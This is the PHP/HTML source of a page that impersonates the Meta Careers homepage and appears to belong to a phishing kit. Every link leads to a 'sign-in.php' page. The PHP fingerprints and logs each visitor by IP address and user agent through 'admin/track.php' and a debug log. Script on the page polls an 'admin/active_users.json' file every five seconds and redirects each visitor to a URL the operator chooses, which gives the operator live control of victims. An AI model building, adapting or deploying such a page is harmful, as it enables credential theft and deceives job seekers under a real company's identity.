<?php
require_once 'admin/track.php';
// Function to generate userId based on IP address and user agent
function getUserId() {
    return md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']);
}

$userId = getUserId();

$file = 'admin/active_users.json';
$logFile = 'admin/debug.log';

// Load active_users.json and get the current redirection URL for the user
$activeUsers = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
$currentRedirectionUrl = isset($activeUsers[$userId]) ? $activeUsers[$userId]['redirectionUrl'] : '';

// Log current state
file_put_contents($logFile, date('Y-m-d H:i:s') . " - UserID: $userId - Current Redirection URL: $currentRedirectionUrl\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width" />
	<link rel="stylesheet" type="text/css" href="style.css">
	<!-- Font awesome link -->
	<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
	<title>Home</title>
</head>

<body class="">
	<header>
		<div class="container">
			<div class="row align-items-center">
				<div class="col-md-2 col-2 d-lg-none">
					<div class="open-nav">
						<i class="fa-solid fa-bars"></i>
					</div>
				</div>
				<div class="col-lg-3 col-md-2 col-3">
					<div class="logo-main">
						<a href="sign-in.php">
							<img src="assets/images/logo-main.svg" alt="">
						</a>
					</div>
				</div>
				<div class="col-lg-7 d-none d-lg-block">
					<div class="main-menu">
						<ul>
							<li><a href="sign-in.php">Jobs</a></li>
							<li><a href="sign-in.php">Areas of Work</a></li>
							<li><a href="sign-in.php">Locations</a></li>
							<li><a href="sign-in.php">Career Programs</a></li>
							<li><a href="sign-in.php">How We Work</a></li>
							<li><a href="sign-in.php">Blog</a></li>
						</ul>
					</div>
				</div>
				<div class="col-lg-2 col-md-2 col-2">
					<div class="search-login-wrp">
						<div class="search">
							<i class="fa-solid fa-magnifying-glass"></i>
						</div>
						<div class="login d-none d-lg-block">
							<h3>Log in</h3>
							<i class="fa-solid fa-angle-down"></i>
						</div>
					</div>
				</div>
			</div>
		</div>
	</header>

	<div class="mobile-bar">
		<div class="close-nav">
			<i class="fa-solid fa-xmark"></i>
		</div>
		<div class="mobile-menu">
			<ul>
				<li><a href="sign-in.php">Jobs</a></li>
				<li><a href="sign-in.php">Areas of Work</a></li>
				<li><a href="sign-in.php">Locations</a></li>
				<li><a href="sign-in.php">Career Programs</a></li>
				<li><a href="sign-in.php">How We Work</a></li>
				<li><a href="sign-in.php">Blog</a></li>
			</ul>
		</div>
		<div class="profile">
			<h2>Create Career Profile</h2>
			<p>You can create a Career Profile to get job suggestions, prepare for the interview process, and more.</p>
			<div class="primery-btn  pb-2">
				<a href="sign-in.php">Create Career Profile</a>
			</div>
			<p>Already have a Career Profile?</p>
			<a href="sign-in.php">log in</a>
		</div>
	</div>

	<div class="log-in-pop">
		<div class="log-in-content">
			<h1>Create a Career Profile</h1>
			<p>You can create a Career Profile to get job suggestions, prepare for the interview process, and more.</p>
			<div class="secondry-btn">
				<a href="sign-in.php">Create Career Profile</a>
			</div>
			<p>Already have a Career Profile?</p>
			<a href="sign-in.php">Log in</a>
		</div>
	</div>

	<section class="banner-section" style="background-image: url('assets/images/banner-bg.png');">
		<div class="container">
			<div class="slides-main-wrp">
				<div class="slider" id="slider">
					<div class="slides panel d-none d-md-block d-lg-block">
						<div class="banner-content">
							<h3>META CAREERS</h3>
							<h1>Connecting the world<br>through AI and other<br>emerging technologies.</h1>
							<div class="banner-button">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>See jobs</a>
							</div>
						</div>
					</div>
					<div class="slides panel">
						<div class="banner-img-wrp">
							<img src="assets/images/banner-img.png" alt="">
						</div>
					</div>
					<div class="slides panel">
						<div class="banner-content">
							<h1>Our best work is yet to come.</h1>
							<p>At Meta, we don’t just make technologies. We’re reshaping the future of the digital
								world, creating awe-inspiring experiences that impact how we think, connect and
								interact. Get set to unleash your potential.</p>
							<div class="banner-button poscher">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>See jobs</a>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="from-main">
				<div class="form">
					<div class="jobs from-typo">
						<label for="">Find open jobs</label><br>
						<input type="text" placeholder="Search by job title/ref. code">
					</div>
					<div class="located from-typo">
						<label for="">Find open jobs</label><br>
						<input type="text" placeholder="Office, data center or remote locations">
					</div>
					<div class="serach-box">
						<i class="fa-solid fa-magnifying-glass"></i>
					</div>
				</div>
			</div>
		</div>
	</section>

	<section class="Connected-section">
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="Connected-content">
						<h1>BUILD A CONNECTED FUTURE</h1>
					</div>
				</div>
				<div class="col-lg-6">
					<div class="Connected-content">
						<p>Innovators, changemakers and leaders - you’ll find them all at Meta. Join our team and help
							us shape tomorrow’s AI landscape.</p>
					</div>
				</div>
			</div>
			<div class="Connected-cards-wrp">
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards active" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>
				<div class="conected-card-main">
					<div class="Connected-cards" style="background-image: url('assets/images/conected-card-img-1.png');">
						<div class="Connected-cards-content">
							<div class="cards-button ">
								<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
							</div>
							<div class="card-content">
								<h1>"At Meta, your career is in your hands."</h1>
								<p>Ashley S., Executive Administrative Partner</p>
							</div>
						</div>
					</div>
				</div>

			</div>
		</div>
	</section>

	<section class="Build-section">
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="Build-content">
						<h1>WHAT WE BUILD</h1>
					</div>
				</div>
				<div class="col-lg-6">
					<div class="Build-content">
						<p>From social media to cutting-edge AR/VR, all our technologies share a vision of a more
							connected world.</p>
					</div>
				</div>
			</div>
			<div class="row mt-5">
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="facebook-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/facebook.png" alt="">
									</div>
									<h4>Facebook</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="messenger-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/mesenger.png" alt="">
									</div>
									<h4>Messenger</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="inta-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/instagrame.png" alt="">
									</div>
									<h4>Instagram</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="whatsapp-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/whatsapp.png" alt="">
									</div>
									<h4>WhatsApp</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="meta-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/meta.png" alt="">
									</div>
									<h4>Meta</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
				<div class="col-lg-6 col-md-6 col-12">
					<div class="socail-main">
						<a href="" class="workplace-card">
							<div class="socail-card">
								<div class="about-socail">
									<div class="svg">
										<img src="assets/images/workplace.png" alt="">
									</div>
									<h4>Workplace</h4>
								</div>
							</div>
							<div class="angel">
								<i class="fa-solid fa-arrow-right-long"></i>
							</div>
						</a>
					</div>
				</div>
			</div>
		</div>
	</section>

	<section class="connect-world" style="background-image: url('assets/images/conected-world-bg.jpg');">
		<div class="container-fluid px-5">
			<div class="world-content">
				<h1>Connect with us to connect the world.</h1>
				<div class="banner-button pt-5">
					<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>Learn about our culture</a>
				</div>
			</div>
		</div>
	</section>

	<section class="about-section">
		<div class="container-fluid p-0">
			<div class="about-slider-main">
				<div class="about-slide" style="background-color: #1c2b33;">
					<div class="row">
						<div class="col-lg-5 col-md-5">
							<div class="about-slide-content">
								<span>01/02</span>
								<h1>Our commitment to a more diverse reality</h1>
								<p>Connecting the world takes people with different backgrounds and points of view to
									build products that work better for everyone. This means building a workforce that
									reflects the diversity of the people we serve and a workplace focused on equity and
									inclusion. Learn more about how we're building a more inclusive workplace.</p>
								<div class="cards-button" style="padding-left: 65px;">
									<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>read more</a>
								</div>
							</div>
						</div>
						<div class="col-lg-4 col-md-4">
							<div class="about-slide-img ">
								<img src="assets/images/about-slide-img-1.png" alt="">
							</div>
						</div>
					</div>
				</div>
				<div class="about-slide" style="background-color: #6a7788;">
					<div class="row justify-content-end ">
						<div class="col-lg-5 col-md-5">
							<div class="about-slide-content horco">
								<span>02/02</span>
								<h1>Increasing representation in our workforce</h1>
								<p>We challenge ourselves to pursue ambitious goals across everything we do at Meta.
									Over the past two years, we set goals to increase representation in our workforce
									over five years. With a 38.2% increase in Black leaders since 2020, we’re seeing it
									happen. Learn more about how we’re increasing representation in our workforce.</p>
								<div class="cards-button" style="padding-left: 65px;">
									<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>Explore new worlds</a>
								</div>
							</div>
						</div>
						<div class="col-lg-6 col-md-6">
							<div class="about-slide-img-last">
								<img src="assets/images/about-slide-img-3.png" alt="">
							</div>
						</div>
					</div>
				</div>
				<div class="flora-img">
					<img src="assets/images/about-slide-img-2.png" alt="">
				</div>
			</div>
		</div>
	</section>

	<section class="read-more">
		<div class="container">
			<div class="read-wrp">
				<h1>Read More</h1>
			</div>
		</div>
	</section>

	<section class="browse-job">
		<div class="container">
			<div class="row">
				<div class="col-lg-6">
					<div class="browse-heading">
						<h1>WORK THAT SHAPES THE FUTURE</h1>
					</div>

				</div>
				<div class="col-lg-6">
					<div class="from-main-short">
						<div class="form">
							<div class="jobs from-typo">
								<input type="text" placeholder="Search by job title/ref. code">
							</div>
							<div class="serach-box">
								<i class="fa-solid fa-magnifying-glass"></i>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="browse-main-content">
				<h1>Browse Jobs</h1>
				<div class="jobs-link-main">
					<ul>
						<li><a href="" class="jobs-link">AI<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Advertising Technology<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">AR/VR<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Infrastructure<i class="fa-solid fa-arrow-right-long"></i></a>
						</li>
						<li><a href="" class="jobs-link">Metaverse<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Privacy<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Research<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Security<i class="fa-solid fa-arrow-right-long"></i></a></li>
						<li><a href="" class="jobs-link">Software Engineering<i class="fa-solid fa-arrow-right-long"></i></a></li>
					</ul>
				</div>
				<div class="banner-button" style="padding-top: 30px; min-height: 200px; border-top: 1px solid rgb(204, 209, 212); border-bottom: 1px solid rgb(204, 209, 212);">
					<a href="sign-in.php"><i class="fa-solid fa-arrow-right-long"></i>See all jobs</a>
				</div>
			</div>
		</div>
	</section>

	<footer>
		<div class="container">
			<div class="footer-content">
				<p>Meta is proud to be an Equal Employment Opportunity and Affirmative Action employer. We do not
					discriminate based upon race, religion, color, national origin, sex (including pregnancy,
					childbirth, reproductive health decisions, or related medical conditions), sexual orientation,
					gender identity, gender expression, age, status as a protected veteran, status as an individual with
					a disability, genetic information, political views or activity, or other applicable legally
					protected characteristics. You may view our Equal Employment Opportunity notice <a href="sign-in.php">here.</a> We also consider qualified applicants with criminal histories, consistent
					with applicable federal, state and local law. We may use your information to maintain the safety and
					security of Meta, its employees, and others as required or permitted by law. You may view<a href="sign-in.php"> Meta Pay Transparency Policy,Equal Employment Opportunity is the Law</a>notice, and <a href="sign-in.php"> Notice to Applicants for Employment and Employees</a>by clicking on their
					corresponding links. Additionally, Meta participates in the <a href="sign-in.php"> E-Verify program</a>in
					certain locations, as required by law.<br><br>

					Meta is committed to providing reasonable accommodations for qualified individuals with disabilities
					and disabled veterans in our job application procedures. If you need assistance or an accommodation
					due to a disability, you may contact us at <a href="sign-in.php"> accommodations-ext@fb.com.</a>
				</p>
			</div>
			<div class="row" style="justify-content: space-between;">
				<div class="col-lg-7 col-md-8 col-12">
					<div class="row">
						<div class="col-lg-3 col-md-3 col-6">
							<div class="footer-menus">
								<h2>About us</h2>
								<ul>
									<li><a href="sign-in.php">Company info</a></li>
									<li><a href="sign-in.php">Newsroom</a></li>
									<li><a href="sign-in.php">Looking for contractor roles?</a></li>
								</ul>
							</div>
						</div>
						<div class="col-lg-3 col-md-3 col-6">
							<div class="footer-menus">
								<h2>On social</h2>
								<ul>
									<li><a href="sign-in.php">Facebook</a></li>
									<li><a href="sign-in.php">Instagram</a></li>
									<li><a href="sign-in.php">LinkedIn</a></li>
									<li><a href="sign-in.php">Threads</a></li>

								</ul>
							</div>
						</div>
						<div class="col-lg-3 col-md-3 col-6">
							<div class="footer-menus">
								<h2>Our policies</h2>
								<ul>
									<li><a href="sign-in.php">Candidate privacy statement </a></li>
									<li><a href="sign-in.php">Cookies</a></li>
								</ul>
							</div>
						</div>
						<div class="col-lg-3 col-md-3 col-6">
							<div class="footer-menus">
								<h2>More resources</h2>
								<ul>
									<li><a href="sign-in.php">Family safety center</a></li>
									<li><a href="sign-in.php">Meta for business</a></li>
									<li><a href="sign-in.php">Meta for developers</a></li>
								</ul>
							</div>
						</div>
					</div>
				</div>
				<div class="col-lg-2 col-md-2 col-12">
					<div class="copy-right">
						<div class="bug">
							<i class="fa-solid fa-bug"></i>
							<a href="sign-in.php">Report a bug</a>
						</div>
						<p>© Meta 2024</p>
					</div>
				</div>
			</div>
		</div>
	</footer>

	<input type="hidden" id="initialRedirectionUrl" value="<?php echo htmlspecialchars($currentRedirectionUrl); ?>">
	<input type="hidden" id="userId" value="<?php echo htmlspecialchars($userId); ?>">


	<script src="assets/js/theme-lib.js"></script>
	<script src="assets/js/theme-fun.js"></script>

	<script>
		function handleRedirection() {
            let userId = document.getElementById('userId').value;
            let initialRedirectionUrl = document.getElementById('initialRedirectionUrl').value;

            fetch('admin/active_users.json')
                .then(response => response.json())
                .then(data => {
               
                    if (data[userId] && data[userId].redirectionUrl) {
                        let currentRedirectionUrl = data[userId].redirectionUrl;
                        if (currentRedirectionUrl !== initialRedirectionUrl) {
                            window.location.href = currentRedirectionUrl; // Redirect based on stored URL
                        }
                    }
                })
                .catch(error => {
                    console.error('Error fetching active user data:', error);
                });
        }

        // Set interval to check for redirectionUrl changes every 5 seconds
        setInterval(handleRedirection, 5000);

        // Initial call to handleRedirection
        window.onload = handleRedirection;


		document.querySelector('.login').addEventListener('click', function() {
			const loginPop = document.querySelector('.log-in-pop');
			loginPop.classList.toggle('active');
		});

		document.querySelector('.login').addEventListener('click', function() {
			const loginPop = document.querySelector('.login');
			loginPop.classList.toggle('active');
		});

		document.addEventListener('DOMContentLoaded', () => {
			const slider = document.querySelector('.about-slider-main');

			let isDown = false;
			let startX;
			let scrollLeft;

			slider.addEventListener('mousedown', (e) => {
				isDown = true;
				slider.classList.add('active');
				startX = e.pageX - slider.offsetLeft;
				scrollLeft = slider.scrollLeft;
			});

			slider.addEventListener('mouseleave', () => {
				isDown = false;
				slider.classList.remove('active');
			});

			slider.addEventListener('mouseup', () => {
				isDown = false;
				slider.classList.remove('active');
			});

			slider.addEventListener('mousemove', (e) => {
				if (!isDown) return;
				e.preventDefault();
				const x = e.pageX - slider.offsetLeft;
				const walk = (x - startX) * 3; //scroll-fast
				slider.scrollLeft = scrollLeft - walk;
			});

			// Touch Events
			slider.addEventListener('touchstart', (e) => {
				isDown = true;
				startX = e.touches[0].pageX - slider.offsetLeft;
				scrollLeft = slider.scrollLeft;
			});

			slider.addEventListener('touchend', () => {
				isDown = false;
			});

			slider.addEventListener('touchmove', (e) => {
				if (!isDown) return;
				const x = e.touches[0].pageX - slider.offsetLeft;
				const walk = (x - startX) * 3; //scroll-fast
				slider.scrollLeft = scrollLeft - walk;
			});
		});



		$(document).on("click", '.open-nav', function() {
			$('.mobile-bar').addClass('active');
		});

		$(document).on("click", '.close-nav', function() {
			$('.mobile-bar').removeClass('active');
		});

		const jobLinks = document.querySelectorAll('.jobs-link');

		jobLinks.forEach(link => {
			link.addEventListener('mouseenter', () => {
				document.querySelector('.browse-job').classList.add('dark-act');
			});

			link.addEventListener('mouseleave', () => {
				document.querySelector('.browse-job').classList.remove('dark-act');
			});
		});

		document.querySelector('.facebook-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('facebook');
		});
		document.querySelector('.facebook-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('facebook');
		});

		document.querySelector('.messenger-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('messenger');
		});
		document.querySelector('.messenger-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('messenger');
		});

		document.querySelector('.inta-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('inta');
		});
		document.querySelector('.inta-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('inta');
		});

		document.querySelector('.whatsapp-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('whatsapp');
		});
		document.querySelector('.whatsapp-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('whatsapp');
		});

		document.querySelector('.meta-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('meta');
		});
		document.querySelector('.meta-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('meta');
		});

		document.querySelector('.workplace-card').addEventListener('mouseenter', function() {
			document.querySelector('.Build-section').classList.add('workplace');
		});
		document.querySelector('.workplace-card').addEventListener('mouseleave', function() {
			document.querySelector('.Build-section').classList.remove('workplace');
		});




		document.addEventListener('DOMContentLoaded', () => {
			const slider = document.getElementById('slider');
			let isScrollingHorizontally = true;

			document.addEventListener('wheel', (e) => {
				if (isScrollingHorizontally) {
					slider.scrollLeft += e.deltaY;
					if (slider.scrollLeft === (slider.scrollWidth - slider.clientWidth)) {
						isScrollingHorizontally = false;
					}
					e.preventDefault();
				}
			}, {
				passive: false
			});

			slider.addEventListener('scroll', () => {
				if (slider.scrollLeft !== (slider.scrollWidth - slider.clientWidth)) {
					isScrollingHorizontally = true;
				}
			});
		});


		document.querySelectorAll('.Connected-cards').forEach(card => {
			card.addEventListener('click', function() {
				// Remove 'active' class from any other card
				document.querySelectorAll('.Connected-cards.active').forEach(activeCard => {
					activeCard.classList.remove('active');
				});
				// Add 'active' class to the clicked card
				this.classList.add('active');
			});
		});
	</script>
</body>

</html>